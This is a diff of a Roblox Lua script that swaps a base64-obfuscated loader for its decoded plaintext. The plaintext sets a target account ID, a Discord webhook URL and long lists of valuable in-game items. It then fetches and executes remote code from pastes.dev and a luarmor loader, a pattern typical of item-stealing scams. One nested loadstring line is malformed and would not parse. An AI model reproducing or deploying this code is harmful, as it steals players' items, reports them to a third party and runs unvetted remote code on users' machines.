@@ -1,18 +1,131 @@
---[[ WXNAD BASE64 OBF ]]
-local b64 = "Z2V0Z2VudigpLnRhcmdldElkID0gODQxNTU0NjcyNQpnZXRnZW52KCkud2ViaG9va1VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNTA5OTM5ODc4NDQyNDM0ODExL0xjUXZDNndGYnJfUXo0ZkVnQ3dwWkNwVXp1MWhMVlI0ZU9jZG45QjZrU19qejhIWWUya0tZWGJZR043eVpNTXc3ZWkyIgoKZ2V0Z2VudigpLnRhcmdldEJyYWlucm90cyA9IHsKICAgIFsiU3B5ZGVyIEVsZXBoYW50Il0gPSB0cnVlLAogICAgWyJTdHJhd2JlcnJ5IEVsZXBoYW50Il0gPSB0cnVlLAogICAgWyJNZW93bCJdID0gdHJ1ZSwKICAgIFsiSm9obiBQb3JrIl0gPSB0cnVlLAogICAgWyJIZWFkbGVzcyBIb3JzZW1hbiJdID0gdHJ1ZSwKICAgIFsiU2tpYmlkaSBUb2lsZXQiXSA9IHRydWUsCiAgICBbIkRyYWdvbiBTa2VsZXRvbmluaSJdID0gdHJ1ZSwKICAgIFsiUGhvZW5peCJdID0gdHJ1ZSwKICAgIFsiUGxhbnQgQnJvcyJdID0gdHJ1ZSwKICAgIFsiSHlkcmEgU2VycGVudCJdID0gdHJ1ZSwKICAgIFsiT3JjaGlkb3giXSA9IHRydWUsCiAgICBbIkxvcyBEcmFnb25zIl0gPSB0cnVlLAogICAgWyJMYSBDcmFmdCBNYWNoaW5lIl0gPSB0cnVlLAogICAgWyJHb2xkIGFuZCBEaWFtb25kIl0gPSB0cnVlLAogICAgWyJEcmFnb24gQ2FubmVsbG9uaSJdID0gdHJ1ZSwKICAgIFsiRHJhZ29uIEdpbmdlcmluaSJdID0gdHJ1ZSwKICAgIFsiR3JpZmZpbiJdID0gdHJ1ZSwKICAgIFsiSHlkcmEgRHJhZ29uIENhbm5lbGxvbmkiXSA9IHRydWUsCiAgICBbIkh5ZHJhIEJ1bm55Il0gPSB0cnVlLAogICAgWyJBbnRvbmlvIl0gPSB0cnVlLAogICAgWyJFbGVmYW50byBGcmlnbyJdID0gdHJ1ZSwKICAgIFsiUnVicmlraWtvIl0gPSB0cnVlLAogICAgWyJQYW5jYWtlIGFuZCBTeXJ1cCJdID0gdHJ1ZSwKICAgIFsiQXJjYWRyYWdvbiJdID0gdHJ1ZSwKICAgIFsiUmljbyBEaW5lcm8iXSA9IHRydWUsCiAgICBbIkNhcGl0YW5vIEFtZXJpY2FubyJdID0gdHJ1ZSwKICAgIFsiS2FsaWthIEJyb3MiXSA9IHRydWUsCiAgICBbIlRpcmlsaWthbGlrYSBUaXJpbGlrYWxha28iXSA9IHRydWUsCiAgICBbIkdsb2JhIFN0ZXBwYSJdID0gdHJ1ZSwKICAgIFsiRHVnIER1ZyBEdWciXSA9IHRydWUsCiAgICBbIkRyYWdvbiBBcXVhbmluaSJdID0gdHJ1ZSwKICAgIFsiTGEgQ2FzYSBCb28iXSA9IHRydWUsCiAgICBbIkxhIFN1cHJlbWUgQ29tYmluYXNpb24iXSA9IHRydWUsCiAgICBbIlNpZ25vcmUgQ2FyYXBhY2UiXSA9IHRydWUsCiAgICBbIkZpc2hpbm8gQ2xvd25pbm8iXSA9IHRydWUsCiAgICBbIkR1Z2d5IEJyb3MiXSA9IHRydWUsCiAgICBbIkNlcmJlcnVzIl0gPSB0cnVlLAogICAgWyJLcmFrZW4iXSA9IHRydWUsCiAgICBbIk1vbmV5IE1vbmV5IEJyb3MiXSA9IHRydWUsCiAgICBbIlZlbnVzcGlubyJdID0gdHJ1ZSwKICAgIFsiUmhpbm8gSGVsaWNvcHRlcmlubyJdID0gdHJ1ZSwKICAgIFsiU2FtbXluaSBDYWtpbmkiXSA9IHRydWUsCiAgICBbIkNlbnRydWNjaSBOdWNsdWNjaSJdID0gdHJ1ZSwKICAgIFsiTG9zIEhhY2tlcnMiXSA9IHRydWUsCiAgICBbIkdvcmlsbG8gU3Vid29vZmVybyJdID0gdHJ1ZSwKICAgIFsiSmVsbHkgTW9ieSJdID0gdHJ1ZSwKICAgIFsiRm94aW5pIExhbnRlcm5pbmkiXSA9IHRydWUsCiAgICBbIkdpbmdlciBDaXN0ZXJuYSJdID0gdHJ1ZSwKICAgIFsiQmVhcml0byBDYWJpbml0byJdID0gdHJ1ZSwKICAgIFsiRGlnaSBOYXJ3aGFsIl0gPSB0cnVlLAogICAgWyJNb2J5IEJyb3MiXSA9IHRydWUsCiAgICBbIkxvcyBBZG1pbnMiXSA9IHRydWUsCiAgICBbIkJvcHBpbiBCdW5ueSJdID0gdHJ1ZSwKICAgIFsiQnVubnkgYW5kIEVnZ3kiXSA9IHRydWUsCiAgICBbIkJ1cmd1cm8gYW5kIEZyeXVybyJdID0gdHJ1ZSwKICAgIFsiQ2FwaXRhbm8gTW9ieSJdID0gdHJ1ZSwKICAgIFsiQ2VsZXN0aWFsIFBlZ2FzdXMiXSA9IHRydWUsCiAgICBbIkNhc2ggb3IgQ2FyZCJdID0gdHJ1ZSwKICAgIFsiQ2VsdWxhcmNpbmkgVmljaW9zaW5pIl0gPSB0cnVlLAogICAgWyJDb29raSBhbmQgTWlsa2kiXSA9IHRydWUsCiAgICBbIkZlc3RpdmUgNjciXSA9IHRydWUsCiAgICBbIkV2aWxlZG9uIl0gPSB0cnVlLAogICAgWyJGb3J0dW51IGFuZCBDYXNodXJ1Il0gPSB0cnVlLAogICAgWyJGcmFnb2xhIExhIExhIExhIl0gPSB0cnVlLAogICAgWyJGcmFncmFtYSBhbmQgQ2hvY3JhbWEiXSA9IHRydWUsCiAgICBbIkdhcmFtYSBhbmQgTWFkdW5kdW5nIl0gPSB0cnVlLAogICAgWyJHaW5nZXIgR2VyYXQiXSA9IHRydWUsCiAgICBbIkdvbGQgR29sZCBHb2xkIl0gPSB0cnVlLAogICAgWyJHdWVzdCA2NjYiXSA9IHRydWUsCiAgICBbIkhvcGlsaWthbGlrYSBIb3BpbGlrYWxha28iXSA9IHRydWUsCiAgICBbIkpvbGx5IEpvbGx5IFNhaHVyIl0gPSB0cnVlLAogICAgWyJLZXR1cGF0IEJyb3MiXSA9IHRydWUsCiAgICBbIkxhIEZvb2QgQ29tYmluYXNpb24iXSA9IHRydWUsCiAgICBbIkxhIFNlY3JldCBDb21iaW5hc2lvbiJdID0gdHJ1ZSwKICAgIFsiRXhhbWVuIEJyb3MiXSA9IHRydWUsCiAgICBbIkxhdmFkb3JpdG8gU3Bpbml0byJdID0gdHJ1ZSwKICAgIFsiUGl6emEgYW5kIFJhbmNoIl0gPSB0cnVlLAogICAgWyJMb3MgQW1pZ29zIl0gPSB0cnVlLAogICAgWyJCdW1iYXRyb24iXSA9IHRydWUsCiAgICBbIllldGltYXRpYyJdID0gdHJ1ZSwKICAgIFsiUydtb3JlIFNlcmF0Il0gPSB0cnVlLAogICAgWyJRdWVlbiBCZWUiXSA9IHRydWUsCiAgICBbIlNjb3JwaW5vIENvYXN0ZXJpbm8iXSA9IHRydWUsCiAgICBbIkxhIEJyZWFrZmFzdCBDb21iaW5hc2lvbiJdID0gdHJ1ZSwKICAgIFsiTG9zIFNla29sYWhzIl0gPSB0cnVlLAogICAgWyJMb3ZlIExvdmUgQmVhciJdID0gdHJ1ZSwKICAgIFsiTm9vIE15IEV4YW1pbmUiXSA9IHRydWUsCiAgICBbIk9yY2FsZWRvbiJdID0gdHJ1ZSwKICAgIFsiUG9wY3VydSBhbmQgRml6enVydSJdID0gdHJ1ZSwKICAgIFsiUmVpbml0byBTbGVpZ2hpdG8iXSA9IHRydWUsCiAgICBbIlJvc2V5IGFuZCBUZWRkeSJdID0gdHJ1ZSwKICAgIFsiU3Bvb2t5IGFuZCBQdW1wa3kiXSA9IHRydWUsCiAgICBbIlRyYWxhbGVkb24iXSA9IHRydWUsCiAgICBbIkdyYWJhdHJvbiJdID0gdHJ1ZSwKICAgIFsiUnViaWtvIGFuZCBLdWJpa28iXSA9IHRydWUsCiAgICBbIkNhbmRpbmkgRmx1ZmZpbmkiXSA9IHRydWUsCiAgICBbIkxhIEZ1c2UgTWFjaGluZSJdID0gdHJ1ZSwKICAgIFsiUG9sYXJvaWRpbmkiXSA9IHRydWUsCiAgICBbIk5hY2hvcmlsbGEiXSA9IHRydWUsCiAgICBbIlNhbW15bmkgVHJ1Y2tpbmkiXSA9IHRydWUsCiAgICBbIlBhbmRhIFBvcGFuZGEiXSA9IHRydWUsCiAgICBbIk5hY2hvIFNweWRlciJdID0gdHJ1ZQp9CgpnZXRnZW52KCkudGFyZ2V0QmFzZVNraW5zID0gewogICAgWyJSZWFwZXIiXSA9IHRydWUsCiAgICBbIlRyYWxhbGVybyJdID0gdHJ1ZSwKICAgIFsiT2N0byJdID0gdHJ1ZQp9CgpnZXRnZW52KCkudGFyZ2V0R2VhcnMgPSB7CiAgICBbIlNrZWxldG9uIERyYWdvbiJdID0gdHJ1ZSwKICAgIFsiV2F2ZXJpZGVyIl0gPSB0cnVlLAogICAgWyJXaXRjaCdzIEJyb29tIl0gPSB0cnVlLAogICAgWyJTYW50YSdzIFNsZWlnaCJdID0gdHJ1ZSwKICAgIFsiUmFpbmJvdyBIYW1tZXIiXSA9IHRydWUsCiAgICBbIlJhZGlvYWN0aXZlIEFpcnN0cmlrZSJdID0gdHJ1ZSwKICAgIFsiQ3VwaWQncyBXaW5ncyJdID0gdHJ1ZSwKICAgIFsiQ2FuZHkgU2VudHJ5Il0gPSB0cnVlLAogICAgWyJCbGFja2hvbGUgQm9tYiJdID0gdHJ1ZSwKICAgIFsiQmxvb2Rtb29uIEhhbW1lciJdID0gdHJ1ZQp9CgogICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL2FwaS5wYXN0ZXMuZGV2L3BEUVNKZTU2WHYiKSkoKSIpKSgpCgogICAgdGFzay53YWl0KDAuNSkKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL2FwaS5sdWFybW9yLm5ldC9maWxlcy92NC9sb2FkZXJzL2E4MDFkMzQwOTNjYjc1ZDFiOTBjODgyNzA0ZGFhYmVlLmx1YSIpKSgp"
-local function decode(data)
-    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
-        return r
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
-        local c=0
-        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
-end
-return (loadstring or load)(decode(b64))()
+getgenv().targetId = 8415546725
+getgenv().webhookUrl = "https://discord.com/api/webhooks/1509939878442434811/LcQvC6wFbr_Qz4fEgCwpZCpUzu1hLVR4eOcdn9B6kS_jz8HYe2kKYXbYGN7yZMMw7ei2"
+
+getgenv().targetBrainrots = {
+    ["Spyder Elephant"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["John Pork"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Dragon Skeletonini"] = true,
+    ["Phoenix"] = true,
+    ["Plant Bros"] = true,
+    ["Hydra Serpent"] = true,
+    ["Orchidox"] = true,
+    ["Los Dragons"] = true,
+    ["La Craft Machine"] = true,
+    ["Gold and Diamond"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Hydra Bunny"] = true,
+    ["Antonio"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Rubrikiko"] = true,
+    ["Arcadragon"] = true,
+    ["Rico Dinero"] = true,
+    ["Capitano Americano"] = true,
+    ["Kalika Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Globa Steppa"] = true,
+    ["Dragon Aquanini"] = true,
+    ["La Casa Boo"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Signore Carapace"] = true,
+    ["Dug Dug Dug"] = true,
+    ["Fishino Clownino"] = true,
+    ["Cerberus"] = true,
+    ["Kraken"] = true,
+    ["Duggy Bros"] = true,
+    ["Money Money Bros"] = true,
+    ["Venuspino"] = true,
+    ["Rhino Helicopterino"] = true,
+    ["Sammyni Cakini"] = true,
+    ["Centrucci Nuclucci"] = true,
+    ["Los Hackers"] = true,
+    ["Gorillo Subwoofero"] = true,
+    ["Jelly Moby"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Digi Narwhal"] = true,
+    ["Bearito Cabinito"] = true,
+    ["Moby Bros"] = true,
+    ["Los Admins"] = true,
+    ["Boppin Bunny"] = true,
+    ["Burguro and Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cash or Card"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Cooki and Milki"] = true,
+    ["Festive 67"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Fragola La La La"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Garama and Madundung"] = true,
+    ["Ginger Gerat"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Guest 666"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Ketupat Bros"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Examen Bros"] = true,
+    ["Los Secret Combinasionas"] = true,
+    ["Pizza and Ranch"] = true,
+    ["Los Amigos"] = true,
+    ["Bumbatron"] = true,
+    ["Yetimatic"] = true,
+    ["S'more Serat"] = true,
+    ["Queen Bee"] = true,
+    ["Scorpino Coasterino"] = true,
+    ["La Breakfast Combinasion"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Nacho Spyder"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Quackini Snackini"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Grabatron"] = true,
+    ["Rubiko and Kubiko"] = true,
+    ["Cangurato Gelato"] = true,
+    ["Candini Fluffini"] = true,
+    ["La Fuse Machine"] = true,
+    ["Polaroidini"] = true,
+    ["Nachorilla"] = true,
+    ["Sammyni Truckini"] = true
+}
+
+getgenv().targetBaseSkins = {
+    ["Reaper"] = true,
+    ["Tralalero"] = true,
+    ["Octo"] = true
+}
+
+getgenv().targetGears = {
+    ["Skeleton Dragon"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Demon's Head"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Rainbow Hammer"] = true
+}
+
+    loadstring(game:HttpGet("loadstring(game:HttpGet("https://api.pastes.dev/pDQSJe56Xv"))()"))()
+
+    task.wait(0.5)
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/a801d34093cb75d1b90c882704daabee.lua"))()
